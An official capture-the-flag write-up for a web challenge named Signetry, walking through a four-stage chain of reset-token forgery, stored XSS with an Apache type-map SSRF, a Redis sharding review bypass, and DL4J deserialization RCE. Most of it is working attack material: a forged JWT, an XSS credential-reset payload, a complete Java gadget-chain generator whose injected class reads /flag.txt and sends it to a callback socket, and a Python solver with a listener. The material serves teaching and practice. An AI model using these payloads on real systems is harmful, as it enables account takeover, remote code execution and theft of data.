![img](../../assets/banner.png)

<img src='../../assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>Signetry</font>

1<sup>st</sup> June 2026

Prepared By: `dimasma0305`

Challenge Author(s): `dimasma0305`

Difficulty: <font color='orange'>Hard</font>

Classification: Official

<br><br>

# Synopsis
Signetry is a Hard Web challenge that demonstrates a four-stage exploit chain leading to remote code execution. The player forges a `qor/auth` password-reset token to obtain maintainer access, combines an Apache type-map internal redirect with stored XSS to obtain a curator session, abuses `go-redis Ring` cross-shard deletion to relay an unreviewed model, and triggers unsafe DL4J deserialization through `preprocessor.bin` to execute attacker-controlled Java code and retrieve the flag.

## Description
**Sir Garran Voss**, Former Lord Captain of the Ashguard, is a knight shaped by poverty, war, and **Maelor's** cruelty, holding the salt-flat line against **Alyss's** undead, the only one the line still trusts to hold it. He is tired of killing, even the dead who wear faces he remembers. During the standoff the Red Priestess lays a shadow over the oath buried in him, an invocation under her breath, and corrupts it. Now Garran hears Maelor where **Stormbound** should be. He turns on the men beside him, swinging his blade like they're already enemies, and it takes soldiers throwing their weight onto him to hold him down. Lucid for a breath, he begs for someone to end him. **Veylen Marr** enters Garran's mind to change the corrupted oath before the standoff breaks. He walks the memories of his life, changing the oath from serving the dead king to protecting the living realm.

## Skills Required
- Ability to audit Go, Java, and React source.
- Familiarity with JWT signing and password-reset flows.
- Familiarity with Apache `mod_negotiation` and internal redirects.
- Understanding of authenticated browser-bot exploitation.
- Understanding of client-side sharding in `go-redis Ring`.
- Familiarity with Java deserialization and gadget chains.

## Skills Learned
- Identify reset-token forgery caused by an unset `qor/auth` HMAC secret.
- Use an Apache type map to reach a loopback endpoint through an internal redirect.
- Execute stored XSS in a service reviewer without reading its HttpOnly cookie.
- Exploit multi-key routing in `go-redis Ring` to preserve a model blob after withdrawal.
- Build a JDK 11 deserialization gadget from DL4J's bundled dependencies.

# Enumeration
## The application
Opening the published edge displays Crownspire's landing page.

![](./assets/Crownspire%20public%20landing.png)

The same page provides registration and sign-in. It also identifies `dms@htb.com` as the platform owner.

![](./assets/the%20Crownspire%20sign-in%20screen.png)

After registering and signing in with a standard account, the player can open the model catalog through **TRACE**. The stage, scan, and promote actions remain restricted by role.

![](./assets/the%20post-login%20registry%20view.png)

## Analyzing the source code
Extracting `signetry.zip` reveals the complete application source with build outputs removed and the flag redacted. The deployment runs in one container. Apache is the only published service; the gateway, Warden bot, registry, and Redis shards listen on loopback.

`apache/signetry.conf` shows that Apache proxies most requests to the gateway but serves `/uploads` directly from disk. The upload directory has content negotiation enabled, and a rewrite rule blocks direct requests to `/internal/*`. Uploaded documents are returned with a sandboxed, no-source CSP, `nosniff`, and an attachment disposition, so they cannot serve as active browser pages.

![The edge config; the three directives behind the type-map SSRF are marked 1 to 3.](./assets/vuln-apache-typemap-ssrf.png)

Three directives affect uploaded `.var` files:

1. `AddHandler type-map .var` makes Apache interpret each `.var` file as a type map. Its `URI:` field selects the internal resource.
2. The rewrite conditions block only direct client requests to `/internal/*`. Internal subrequests and redirects are allowed.
3. `ProxyPass /uploads !` keeps uploaded files outside the reverse proxy, so Apache processes the type map itself.

A direct `GET /internal/dispatch` returns `403`. Requesting an uploaded type map causes an internal redirect, which satisfies the rewrite rule's subrequest exception and reaches the same endpoint.

Reviewing `crownspire/internal/handler/handler.go` identifies the authorization groups and their capability checks.

![handler.go; the capability-gated route groups are marked.](./assets/crownspire-route-gates.png)

1. `RequireSession` permits catalog access.
2. `RequireMaintainer` protects model writes, appeal submission, and attachment uploads.
3. `RequireAppealReview` permits the service reviewer and curators to read appeals.
4. `RequireCredentialReissue` permits only the service reviewer to reset a curator credential.
5. `RequireModelFinalize` permits only a curator to finalize a model.
6. `loopbackOnly` protects `/internal/dispatch` and `/internal/queue`.

These groups set the player's access requirements. Appeal submission and model staging need a maintainer session, finalization needs a curator session, and review dispatch must originate from inside the container.

The Warden bot logs in with a service role and opens each queued `/admin` page in headless Chromium. The service role can review appeals and reissue a curator credential, but it cannot finalize models. Browser requests are restricted to Crownspire's exact internal origin. Crownspire's CSP also sandboxes pages without popup permission while retaining scripts, same-origin requests, and forms. The bot authenticates to `/internal/queue` with `WARDEN_QUEUE_TOKEN`, while `/internal/dispatch` has no equivalent token check. The player only needs to dispatch a review; direct access to the queue is unnecessary.

![The appeal review queue opened by the Warden service.](./assets/the%20curator-only%20appeal%20review%20queue.png)

The internal Signetry service listens on loopback port 1338. `RegistryController.java` accepts models through `/certify` only when Crownspire supplies a per-boot internal token. `CertifierService.java:31-58` then validates each archive before loading it with `ModelSerializer.restoreMultiLayerNetwork()`.

Source review establishes the four stages of the solution. The player needs maintainer access to stage a model, curator access to finalize it, a way to remove the review markers without deleting the model, and a payload that executes when the registry restores the model.

# Solution
## Finding the vulnerability
### Stage 1: Maintainer account takeover
Requests to the model routes return `401` without a session. A standard account can browse the catalog but cannot use `/stage`, `/seal`, or `/withdraw`. Crownspire stores random session identifiers on the server, so the player cannot forge a maintainer session directly. The public catalog identifies `dms@htb.com` as the platform owner, which makes its password-reset flow the next authentication path to inspect.

Crownspire uses `github.com/qor/auth` for password-provider operations. In that dependency, `auth.New()` creates an HS256 `SessionStorer` without assigning `SignedString`:

![auth.go; the default SessionStorer is built with HS256 and no SignedString field.](./assets/vuln-qor-default-storer.png)

`ValidateClaims` later uses `SignedString` as the verification key:

![session_storer.go; ValidateClaims verifies the token against the empty SignedString key.](./assets/vuln-qor-empty-key.png)

Because the field remains at its zero value, `ValidateClaims` accepts HS256 tokens signed with `[]byte("")`. Crownspire creates the vulnerable default at `crownspire/internal/auth/authenticator.go:46`. The adjacent `password.New` call configures the password provider and does not affect token signing.

![authenticator.go; the qor/auth initialization that leaves SignedString unset is circled.](./assets/vuln-auth-empty-hmac-key.png)

The challenge mounts its own reset wrapper rather than qor/auth's stock reset handler. `POST /auth/password/update` calls `Authenticator.ResetPassword()`, which validates the forgeable token, reads the target from its `jti`, restricts it to `dms@htb.com`, and saves the new password at `authenticator.go:150-187`.

![authenticator.go; token validation, the maintainer check, and the password update are marked 1 to 3.](./assets/vuln-auth-reset-wrapper.png)

1. `ValidateClaims` verifies the token with the empty HMAC key.
2. The handler takes the account from `claims.Id` and accepts only the maintainer address.
3. `setPassword` hashes and saves the supplied password.

The reset page offers to email a link, but email delivery is under maintenance. Token validation does not depend on that email. The player can sign an HS256 token with the empty key, set its `jti` to `dms@htb.com`, and submit a chosen password:

```http
POST /auth/password/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

reset_password_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJkbXNAaHRiLmNvbSJ9.tUUYI_xBWaeAFAlVB8q7SjWKTZbTH9dai2dlYh0W9fU&new_password=Marr_Reset_2026%21

POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

login=dms@htb.com&password=Marr_Reset_2026%21
```

The login response contains the session identifier used in the `Authorization` header. `GET /api/whoami` confirms the `maintainer` role. Crownspire's login sessions remain random and server-side; the weakness is limited to reset-token validation.

### Stage 2: Curator account takeover
Calling `/finalize` with the maintainer session returns `403`. The finalization route requires a curator, and the seeded curator is `conservator@htb.com`; its password is not exposed. The Warden has a separate service role and visits `/admin`, where `MemoryBank.jsx` passes each maintainer-controlled appeal body to `html-react-parser`. The service role cannot call `/finalize`, but it can reissue a curator credential.

![MemoryBank.jsx's review-queue modal; parse() still renders event attributes from appeal HTML.](./assets/vuln-appeal-xss-sink.png)

The `parse()` call renders `a.body` as live DOM. Its replacement hook removes navigation, script, and child-document elements but leaves custom elements and their event attributes intact.

After the Stage 1 takeover, the player opens the Appeals page and submits the payload with the maintainer session.

![](./assets/the%20appeals%20page.png)

The Warden does not review an appeal until `/internal/dispatch` places it on the queue. A direct request returns `403`, as expected from the Apache rule found during enumeration. The player uses the maintainer session identifier as `$MAINTAINER_SESSION` and uploads a type map that provides the internal request:

```http
POST /api/attachments?name=trigger.var HTTP/1.1
Authorization: $MAINTAINER_SESSION
Content-Type: text/plain

URI: ../internal/dispatch
Content-Type: text/html

GET /uploads/trigger.var HTTP/1.1
```

The `URI:` value is relative to `/uploads/`, so `../internal/dispatch` resolves to the loopback-only route. Apache also requires the `Content-Type` entry; without it, negotiation returns `406`.

The appeal payload still has to run in the Warden's browser. React strips event handlers from standard elements such as `<img onerror>`. Crownspire's policy in `crownspire/internal/handler/security.go` blocks inline `<script>` elements, and the appeal parser removes navigation, script, and child-document elements. The policy allows inline event attributes through `script-src-attr 'unsafe-inline'`, while React preserves those attributes on custom elements. `autofocus` does not fire after the asynchronous render, but a CSS animation triggers `onanimationstart` when the element enters the document.

The session cookie is HttpOnly, so the payload cannot read it. A same-origin `fetch` still includes the cookie and can call the service-only credential reset endpoint. The reset policy permits a curator target but rejects service, maintainer, and viewer targets:

```html
<style>@keyframes xp{from{opacity:1}to{opacity:.99}}</style>
<x-review style="animation:xp 1ms" onanimationstart="
  fetch('/admin/credential/reset',{method:'POST',credentials:'include',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:'conservator@htb.com',new_password:'Review_Reset_2026!'})})">z</x-review>
```

After the Warden renders the appeal, the payload changes the password for `conservator@htb.com`. Logging in with that password returns a curator session.

### Stage 3: Model review bypass
The player now has the maintainer session needed to stage a model and the curator session needed to finalize it. The normal `/seal` path accepts an archive containing only `configuration.json` and `coefficients.bin`. It rejects a model with `preprocessor.bin`, so the player examines how `/withdraw` removes an unsealed draft.

`go-redis Ring` uses client-side sharding over two independent Redis instances. A multi-key command is routed according to its first key, and the complete command runs on that shard. `Withdraw()` at `crownspire/internal/store/store.go:43-48` calls `DEL(unsealed, intake, blob)`, so keys assigned to the other shard are not removed.

The required placement has `unsealed` and `intake` on the first shard and `blob` on the second. `/withdraw` then removes both review markers but leaves the model. Because `Sealed()` at `store.go:55-59` checks only for the absence of those markers, `/finalize` accepts the remaining blob. Random model tokens produce this placement in about one quarter of attempts.

The source also rules out the attestation paths. `/seal` and the registry's `/publish` route verify per-boot secrets that no external route discloses.

![store.go; the correct per-key delete (1) versus the buggy multi-key delete (2).](./assets/vuln-store-cross-shard-del.png)

1. `ClearMarkers` deletes each key in its own `Del`, so every key reaches its own shard.
2. `Withdraw` deletes all three keys in one multi-key `Del`. go-redis `Ring` routes a multi-key command to the first key's shard only, so a blob that shards apart from `unsealed` survives while the markers clear.

### Stage 4: Unsafe model deserialization
With the review markers gone, the player can call `/finalize` using the curator session. Crownspire authenticates to the loopback `/certify` route with the per-boot registry token and relays the surviving model. The controller then passes the request body to `CertifierService.accept()`.

![CertifierService.java; the validator (1) passes the model, then the raw deserialize (2) fires.](./assets/vuln-certifier-deserialize-rce.png)

1. `DL4JModelValidator.validateMultiLayerNetwork` (`CertifierService.java:35`) checks the archive but ignores the optional `preprocessor.bin` sidecar.
2. `restoreMultiLayerNetwork()` (`CertifierService.java:58`) deserializes that sidecar with a raw `ObjectInputStream`.

`org/deeplearning4j/util/ModelSerializer.java:304-315` performs the deserialization before checking the resulting type:

```java
byte[] prep = zipFile.get(PREPROCESSOR_BIN);
if (prep != null) {
    InputStream stream = new ByteArrayInputStream(prep);
    ObjectInputStream ois = new ObjectInputStream(stream);

    try {
        preProcessor = (DataSetPreProcessor) ois.readObject();
    } catch (ClassNotFoundException e) {
        throw new RuntimeException(e);
    }

    gotPreProcessor = true;
}
```

`readObject()` processes the object graph before the cast to `DataSetPreProcessor`. A compatible gadget graph can therefore execute during model restoration. The registry runs on JDK 11, and its `pom.xml` excludes `commons-collections4`. The supplied payload uses the shaded Guava and Jackson classes already present in nd4j together with JDK `TemplatesImpl`.

## Exploitation
`local.poc.SignetryPayload` builds the poisoned `preprocessor.bin` with classes already present in the registry. Its translet reads `/flag.txt` and connects to the callback address stored in a fixed-length placeholder. The solver patches that address before staging the model. The registry exposes `/files` only on its loopback service, so the exploit returns the flag through the outbound connection.

The complete payload generator follows:

```java
package local.poc;

import javassist.*;
import org.deeplearning4j.nn.conf.MultiLayerConfiguration;
import org.deeplearning4j.nn.conf.NeuralNetConfiguration;
import org.deeplearning4j.nn.conf.layers.OutputLayer;
import org.deeplearning4j.nn.multilayer.MultiLayerNetwork;
import org.deeplearning4j.util.ModelSerializer;
import org.nd4j.linalg.activations.Activation;
import org.nd4j.linalg.lossfunctions.LossFunctions;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.*;
import java.util.*;
import java.util.zip.*;

/**
 * Builds a DL4J model ZIP with a serialized gadget in `preprocessor.bin`.
 *
 * DL4JModelValidator ignores the sidecar. ModelSerializer later reads it through
 * ObjectInputStream. PriorityQueue invokes shaded Guava's UsingToStringOrdering,
 * which calls POJONode.toString(). Shaded Jackson then reaches
 * TemplatesImpl.newTransformer() and initializes the translet.
 *
 * Javassist removes BaseJsonNode.writeReplace() before Jackson loads so POJONode
 * serializes directly. Javassist is required only while building the payload.
 *
 * The target is DL4J 1.0.0-M2.1 on Java 11. The serialized graph contains shaded
 * Guava, shaded Jackson, and JDK classes available in the registry.
 *
 * Args:
 *   [0] output model zip   (default: model-rce.zip)
 *   [1] flag source path   (default: /flag.txt)
 *   [2] standalone blob out (default: <model>.preprocessor.bin): the raw serialized
 *       sidecar retained for inspection and gadget testing.
 *
 * The translet exfiltrates the flag over a TCP socket to a 48-byte host:port
 * placeholder (EXFIL_PLACEHOLDER) that the official solver overwrites in-place
 * (same length) at solve time, so retargeting needs no Java toolchain.
 */
public class SignetryPayload {

    public static void main(String[] args) throws Exception {
        String modelPath = args.length > 0 ? args[0] : "model-rce.zip";
        String flagSrc   = args.length > 1 ? args[1] : "/flag.txt";
        String blobPath  = args.length > 2 ? args[2] : modelPath + ".preprocessor.bin";

        Path modelFile = Path.of(modelPath).toAbsolutePath();
        Files.createDirectories(modelFile.getParent());
        Files.deleteIfExists(modelFile);

        System.out.println("[payload] flag=" + flagSrc + " -> exfil placeholder=" + EXFIL_PLACEHOLDER);

        // Strip BaseJsonNode.writeReplace() before any Jackson class loads.
        System.out.println("[payload] patching shaded BaseJsonNode (remove writeReplace)...");
        removeWriteReplace();

        // Build TemplatesImpl with the translet bytecode.
        System.out.println("[payload] building TemplatesImpl translet...");
        Object templates = createTemplatesImpl(flagSrc);

        // Wrap TemplatesImpl in the shaded POJONode after applying the patch.
        Object pojoNode = Class.forName("org.nd4j.shade.jackson.databind.node.POJONode")
                .getDeclaredConstructor(Object.class).newInstance(templates);

        // Use the shaded Guava ordering as the PriorityQueue comparator.
        Class<?> utoClass = Class.forName("org.nd4j.shade.guava.collect.UsingToStringOrdering");
        Field instanceField = utoClass.getDeclaredField("INSTANCE");
        instanceField.setAccessible(true);
        @SuppressWarnings("unchecked")
        Comparator<Object> toStringOrdering = (Comparator<Object>) instanceField.get(null);

        PriorityQueue<Object> queue = new PriorityQueue<>(2, toStringOrdering);
        queue.add("dummy1");
        queue.add("dummy2");
        // Replace the heap entries after add() to avoid triggering the gadget here.
        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queueArr = (Object[]) queueField.get(queue);
        queueArr[0] = pojoNode;
        queueArr[1] = pojoNode;

        System.out.println("[payload] serializing PriorityQueue/UsingToStringOrdering/POJONode chain...");
        byte[] payload = serialize(queue);
        System.out.println("[payload] payload size=" + payload.length);

        // Write the standalone gadget blob for inspection and sidecar tests.
        Path blobFile = Path.of(blobPath).toAbsolutePath();
        Files.createDirectories(blobFile.getParent());
        Files.write(blobFile, payload);
        System.out.println("[payload] wrote blob " + blobFile);

        // Write the complete poisoned model used by the solver and local gadget test.
        writeBenignModel(modelFile);
        injectPreprocessorSidecar(modelFile, payload);

        System.out.println("[payload] wrote " + modelFile);
        System.out.println("[payload] done");
    }

    /**
     * Remove writeReplace() from the shaded BaseJsonNode so POJONode serializes
     * directly. This must run before any Jackson class loads.
     */
    private static void removeWriteReplace() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ct = pool.get("org.nd4j.shade.jackson.databind.node.BaseJsonNode");
        try {
            ct.removeMethod(ct.getDeclaredMethod("writeReplace"));
        } catch (NotFoundException e) {
            return;
        }
        ct.toClass(Thread.currentThread().getContextClassLoader(), null);
    }

    private static Object createTemplatesImpl(String flagSrc) throws Exception {
        byte[] classBytes = generateTransletBytecode(flagSrc);

        Class<?> templatesClass = Class.forName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Object templates = templatesClass.getDeclaredConstructor().newInstance();

        setField(templates, "_bytecodes", new byte[][]{classBytes});
        setField(templates, "_name", "Signetry");
        setField(templates, "_tfactory",
                Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl")
                        .getDeclaredConstructor().newInstance());
        setField(templates, "_sdom", new ThreadLocal<>());
        return templates;
    }

    /**
     * Fixed-length (48-byte) callback placeholder. The official solver overwrites these
     * exact bytes in the serialized blob with the real "host:port" (padded back to 48)
     * before staging, so retargeting the exfil needs no Java toolchain at solve time.
     */
    static final String EXFIL_PLACEHOLDER =
            "@@SIGEXFIL@@127.0.0.1:09001@@@@@@@@@@@@@@@@@@@@@";

    /**
     * Translet whose constructor reads the flag and sends it to the configured TCP
     * listener. The registry's `/files` endpoint is not exposed at the Apache edge.
     */
    private static byte[] generateTransletBytecode(String flagSrc) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(
                Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet")));

        CtClass clazz = pool.makeClass("local.poc.SignetTranslet" + System.nanoTime());
        clazz.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));

        String body = "{"
                + "try { java.io.FileOutputStream m = new java.io.FileOutputStream(\"/tmp/.sig_ran\");"
                + " m.write(\"SIGNETRY_CTOR_RAN\".getBytes()); m.close(); } catch (java.lang.Throwable e1) {}"
                + "try {"
                + " String tg = \"" + EXFIL_PLACEHOLDER + "\";"
                + " tg = tg.substring(12);"
                + " int z = tg.indexOf(\"@@\");"
                + " if (z >= 0) { tg = tg.substring(0, z); }"
                + " int ci = tg.lastIndexOf(\":\");"
                + " String h = tg.substring(0, ci);"
                + " int pn = Integer.parseInt(tg.substring(ci + 1));"
                + " java.io.File ff = new java.io.File(\"" + esc(flagSrc) + "\");"
                + " byte[] fb = new byte[(int) ff.length()];"
                + " java.io.FileInputStream fis = new java.io.FileInputStream(ff);"
                + " fis.read(fb); fis.close();"
                + " java.net.Socket sk = new java.net.Socket(h, pn);"
                + " java.io.OutputStream os = sk.getOutputStream();"
                + " os.write(fb); os.flush(); sk.close();"
                + "} catch (java.lang.Throwable e2) {}"
                + "}";

        CtConstructor ctor = new CtConstructor(new CtClass[0], clazz);
        ctor.setBody(body);
        clazz.addConstructor(ctor);

        clazz.addMethod(CtNewMethod.make(
                "public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d, "
                        + "com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) "
                        + "throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", clazz));
        clazz.addMethod(CtNewMethod.make(
                "public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d, "
                        + "com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i, "
                        + "com.sun.org.apache.xml.internal.serializer.SerializationHandler h) "
                        + "throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", clazz));

        byte[] bytecode = clazz.toBytecode();
        clazz.detach();
        return bytecode;
    }

    private static String esc(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private static void writeBenignModel(Path modelFile) throws IOException {
        MultiLayerConfiguration conf = new NeuralNetConfiguration.Builder()
                .list()
                .layer(new OutputLayer.Builder(LossFunctions.LossFunction.MSE)
                        .nIn(1).nOut(1).activation(Activation.IDENTITY).build())
                .build();
        MultiLayerNetwork net = new MultiLayerNetwork(conf);
        net.init();
        ModelSerializer.writeModel(net, modelFile.toFile(), false);
    }

    private static void injectPreprocessorSidecar(Path modelFile, byte[] payload) throws Exception {
        Path tempFile = modelFile.resolveSibling(modelFile.getFileName() + ".tmp");
        Files.deleteIfExists(tempFile);
        try (ZipFile source = new ZipFile(modelFile.toFile());
             ZipOutputStream out = new ZipOutputStream(Files.newOutputStream(tempFile))) {
            Enumeration<? extends ZipEntry> entries = source.entries();
            while (entries.hasMoreElements()) {
                ZipEntry e = entries.nextElement();
                out.putNextEntry(new ZipEntry(e.getName()));
                source.getInputStream(e).transferTo(out);
                out.closeEntry();
            }
            ZipEntry pp = new ZipEntry(ModelSerializer.PREPROCESSOR_BIN);
            pp.setSize(payload.length);
            out.putNextEntry(pp);
            out.write(payload);
            out.closeEntry();
        }
        Files.move(tempFile, modelFile, StandardCopyOption.REPLACE_EXISTING);
    }

    private static void setField(Object obj, String name, Object value) throws Exception {
        Field f = obj.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(obj, value);
    }

    private static byte[] serialize(Serializable object) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(object);
            oos.flush();
        }
        return baos.toByteArray();
    }
}
```

### Connecting to the server
The player supplies a callback address that the registry can reach. The solver opens the listener before sending the first request. A favorable Redis placement occurs in approximately one quarter of attempts, so the solver repeats `stage`, `withdraw`, and `finalize` until `/finalize` returns `202`.

<details>
<summary><code>htb/solver.py</code> (full solver)</summary>

```python
#!/usr/bin/env python3
"""
Signetry: official solver.

Front service: Crownspire (Go + gin + go-redis Ring), the only public service.
Back service:  Signetry registry (DL4J, internal): the deserialization sink + flag.

The solve() function implements four stages.

Stage 1 takes over the maintainer account. Crownspire stores opaque login sessions on
the server, but POST /auth/password/update validates reset tokens through qor/auth's
default SessionStorer. The application never sets its signing secret, so an HS256 token
signed with an empty HMAC key can reset the published maintainer account.

Stage 2 obtains a curator session. The maintainer submits stored XSS in an appeal and
uses an Apache mod_negotiation type map to reach the loopback-only
/internal/dispatch endpoint. The Warden opens the appeal with a service session.
Because its cookie is HttpOnly, the payload uses a same-origin request to reset the
conservator's password.

Stage 3 bypasses model review. /withdraw sends DEL(unsealed, intake, blob) through a
go-redis Ring. The Ring selects a shard from the first key, so a blob on the other shard
survives after both review markers are removed. This placement occurs in about one
quarter of attempts.

Stage 4 triggers unsafe DL4J deserialization. ModelSerializer restores the poisoned
preprocessor.bin with a raw ObjectInputStream. The gadget reads /flag.txt and sends it
to the callback listener because the registry's /files endpoint is not exposed at the
Apache edge.

The solver uses only the Python standard library and retries the Redis stage until
finalization succeeds.
"""

import argparse
import base64
import hashlib
import hmac
import io
import json
import os
import re
import socket
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import zipfile

DEFAULT_MODEL = os.path.join(os.path.dirname(os.path.abspath(__file__)), "poisoned-model.zip")

# Fixed-length (48-byte) callback placeholder baked into the gadget translet. The solver
# overwrites these exact bytes in the model's preprocessor.bin with the real host:port
# (padded back to 48 bytes), so the translet connects to the configured listener. Keep in sync
# with SignetryPayload.EXFIL_PLACEHOLDER.
EXFIL_PLACEHOLDER = b"@@SIGEXFIL@@127.0.0.1:09001@@@@@@@@@@@@@@@@@@@@@"

# The maintainer account appears in GET /api/models. Its generated password is
# unknown, so the reset flaw assigns a known password.
MAINTAINER = "dms@htb.com"
NEW_PASSWORD = "Marr_Reset_2026!"

# /finalize requires the curator role. The Warden's service session resets this
# account through stored XSS, after which the solver logs in with the new password.
CONSERVATOR = "conservator@htb.com"
CURATOR_PW = "Review_Reset_2026!"

# The appeal parser blocks navigation and executable elements but preserves event
# attributes on custom elements. A CSS animation triggers onanimationstart after
# the async render. The handler performs the credential reset in the same origin.
MXSS_PAYLOAD = (
    '<style>@keyframes xp{from{opacity:1}to{opacity:.99}}</style>'
    '<x-review style="animation:xp 1ms" onanimationstart="'
    "fetch('/admin/credential/reset',{method:'POST',credentials:'include',"
    "headers:{'Content-Type':'application/json'},"
    "body:JSON.stringify({uid:'" + CONSERVATOR + "',new_password:'" + CURATOR_PW + "'})})"
    '">z</x-review>'
)


def _b64u(b: bytes) -> bytes:
    return base64.urlsafe_b64encode(b).rstrip(b"=")


def forge_reset_token(uid: str) -> str:
    """Forge a qor/auth password-reset token signed with an empty HMAC key.

    qor/auth's SessionStorer leaves SignedString unset, so ValidateClaims verifies
    HS256 against []byte(""). The reset handler trusts claims.Id (the JWT `jti`) as
    the target account, so the token uses the supplied uid.
    """
    header = _b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = _b64u(json.dumps({"jti": uid}, separators=(",", ":")).encode())
    signing_input = header + b"." + payload
    sig = _b64u(hmac.new(b"", signing_input, hashlib.sha256).digest())  # key = ""
    return (signing_input + b"." + sig).decode()


def http(method, url, data=None, ctype="application/json", extra=None, timeout=15):
    headers = {}
    if data is not None:
        headers["Content-Type"] = ctype
    if extra:
        headers.update(extra)
    req = urllib.request.Request(url, data=data, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def form(fields):
    return urllib.parse.urlencode(fields).encode(), "application/x-www-form-urlencoded"


def takeover(gw):
    """Reset the maintainer password and return an authenticated session header."""
    print(f"[*] forging a qor/auth reset token for {MAINTAINER} (empty signing secret)")
    body, ctype = form({"reset_password_token": forge_reset_token(MAINTAINER), "new_password": NEW_PASSWORD})
    st, _ = http("POST", f"{gw}/auth/password/update", data=body, ctype=ctype)
    if st != 200:
        raise RuntimeError(f"password reset failed (HTTP {st})")

    print("[*] logging in with the new password")
    body, ctype = form({"login": MAINTAINER, "password": NEW_PASSWORD})
    st, resp = http("POST", f"{gw}/api/login", data=body, ctype=ctype)
    if st != 200:
        raise RuntimeError(f"login failed (HTTP {st})")
    sid = json.loads(resp)["session"]
    staff = {"Authorization": sid}

    st, who = http("GET", f"{gw}/api/whoami", extra=staff)
    if st == 200:
        print(f"[+] session established, whoami: {who.decode(errors='replace').strip()}")
    return staff


def client_takeover(gw, staff, wait=10):
    """Obtain a curator session through the Warden appeal review.

    The stored XSS resets the conservator password when the Warden renders the
    appeal. An Apache type map reaches the loopback-only dispatch endpoint.
    """
    print("[*] submitting stored XSS appeal (custom-element onanimationstart)")
    st, _ = http("POST", f"{gw}/api/appeals",
                 data=json.dumps({"body": MXSS_PAYLOAD}).encode(), extra=staff)
    if st != 200:
        raise RuntimeError(f"appeal submission failed (HTTP {st})")
    print("[*] uploading type map and dispatching the Warden through an internal redirect")
    st, _ = http("POST", f"{gw}/api/attachments?name=trigger.var",
                 data=b"URI: ../internal/dispatch\nContent-Type: text/html\n",
                 ctype="text/plain", extra=staff)
    if st != 200:
        raise RuntimeError(f"type-map upload failed (HTTP {st})")
    st, _ = http("GET", f"{gw}/uploads/trigger.var")
    if st != 202:
        raise RuntimeError(f"Warden dispatch failed (HTTP {st})")
    print(f"[*] waiting {wait}s for the Warden to triage the queue")
    time.sleep(wait)

    body, ctype = form({"login": CONSERVATOR, "password": CURATOR_PW})
    st, resp = http("POST", f"{gw}/api/login", data=body, ctype=ctype)
    if st != 200:
        raise RuntimeError("curator takeover failed: the Warden did not reissue the credential")
    cur = {"Authorization": json.loads(resp)["session"]}
    st, who = http("GET", f"{gw}/api/whoami", extra=cur)
    print(f"[+] curator session established, whoami: {who.decode(errors='replace').strip()}")
    return cur


def patch_model(model_bytes, lhost, lport):
    """Overwrite the 48-byte exfil placeholder in the model's preprocessor.bin with the
    callback host and port, padded to the same length.

    The placeholder is inside the compressed preprocessor.bin entry. Rewriting that
    entry through zipfile also updates its CRC."""
    target = f"{lhost}:{lport}".encode()
    field = b"@@SIGEXFIL@@" + target
    if len(field) > len(EXFIL_PLACEHOLDER):
        raise ValueError(f"host:port too long ({len(target)} bytes) for the 48-byte placeholder")
    field = field + b"@" * (len(EXFIL_PLACEHOLDER) - len(field))

    src = zipfile.ZipFile(io.BytesIO(model_bytes), "r")
    out = io.BytesIO()
    patched = False
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zout:
        for item in src.infolist():
            data = src.read(item.filename)
            if EXFIL_PLACEHOLDER in data:
                data = data.replace(EXFIL_PLACEHOLDER, field)
                patched = True
            zout.writestr(item, data)
    if not patched:
        raise RuntimeError("exfil placeholder not found in model; regenerate the gadget (_gen.sh)")
    return out.getvalue()


def _listen(lport, holder):
    """Background TCP listener body; pulls HTB{...} out of whatever the gadget sends."""
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", lport))
    srv.listen(8)
    srv.settimeout(1.0)
    while not holder.get("stop") and not holder.get("flag"):
        try:
            conn, _ = srv.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        with conn:
            conn.settimeout(4)
            data = b""
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    data += chunk
            except Exception:
                pass
        m = re.search(rb"HTB\{[^}]*\}", data)
        if m:
            holder["flag"] = m.group(0).decode()
    try:
        srv.close()
    except Exception:
        pass


class Listener:
    """Background flag-callback listener. `.get(timeout)` blocks until the gadget
    connects back with the flag, returning the HTB{...} string (or None on timeout)."""

    def __init__(self, lport):
        self._holder = {}
        self._thread = threading.Thread(target=_listen, args=(lport, self._holder), daemon=True)
        self._thread.start()
        time.sleep(0.3)

    def get(self, timeout=45):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self._holder.get("flag"):
                return self._holder["flag"]
            time.sleep(0.3)
        self._holder["stop"] = True
        return self._holder.get("flag")


def start_listener(lport):
    """Start the background flag-callback listener and return its handle."""
    return Listener(lport)


